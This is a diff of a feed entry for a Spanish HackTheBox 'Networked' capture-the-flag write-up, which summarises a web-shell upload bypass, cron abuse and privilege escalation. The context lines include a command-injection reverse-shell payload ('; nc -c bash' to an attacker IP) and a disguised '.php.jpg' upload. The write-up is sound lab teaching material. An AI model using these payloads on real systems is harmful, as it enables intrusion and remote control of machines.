@@ -29,9 +29,8 @@
         
         <atom:modified>Sat, 16 Nov 2019 00:00:00 +0000</atom:modified>
         <guid>https://sckull.github.io/posts/networked/</guid>
-        <description>Networked es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
-        <content:encoded>&lt;p&gt;Networked es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
-
+        <description>Encontramos una pagina web donde pudimos subir una web shell realizando Bypass utilizando exiftool. Un CronJob nos permitio ejecutar una shell inversa y acceder al siguiente usuario.</description>
+        <content:encoded>
 
 
 
@@ -43,6 +42,7 @@
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
+&lt;p&gt;Encontramos una pagina web donde pudimos subir una web shell realizando Bypass utilizando exiftool. Un CronJob nos permitio ejecutar una shell inversa y acceder al siguiente usuario. Escalamos privilegios ejecutando una shell a travez de un script de bash.&lt;/p&gt;
 &lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
@@ -107,7 +107,6 @@
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;hr /&gt;
 &lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp/udp con masscan y nmap.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -265,7 +264,7 @@ mv 127.jpg 127.php.jpg
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Obtenemos nuestra shell como usuario apache.&lt;/p&gt;
-&lt;h1 id=&#34;usuario---guly&#34;&gt;USUARIO - guly&lt;/h1&gt;
+&lt;h1 id=&#34;usuario---guly&#34;&gt;USUARIO - GULY&lt;/h1&gt;
 &lt;p&gt;Dentro de los archivos que encontramos en la carpeta principal del usuario guly, de los cuales podemos leer solo dos, vemos un archivo de tipo cronjob y uno de php.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.06.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;El archivo cron se encarga de ejecutar el comando &lt;strong&gt;php /home/guly/check_attack.php&lt;/strong&gt; cada 3 mins.&lt;/p&gt;
@@ -309,8 +308,7 @@ $logpath = &amp;#39;/tmp/attack.log&amp;#39;;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; nc -c bash 10.10.15.129 &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;touch&#34;&gt;Touch&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.03.39.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.03.39.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Y para cuando el cron se active y ejecute el archivo y, al borrar nuestro archivo va a ejecutar lo siguiente:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -391,6 +389,14 @@ cat &amp;gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;span class=&#34;s&#34
           
             
               <category>Jail Escaping Bash</category>
+            
+          
+            
+              <category>exiftool</category>
+            
+          
+            
+              <category>cron</category>
             
           
         
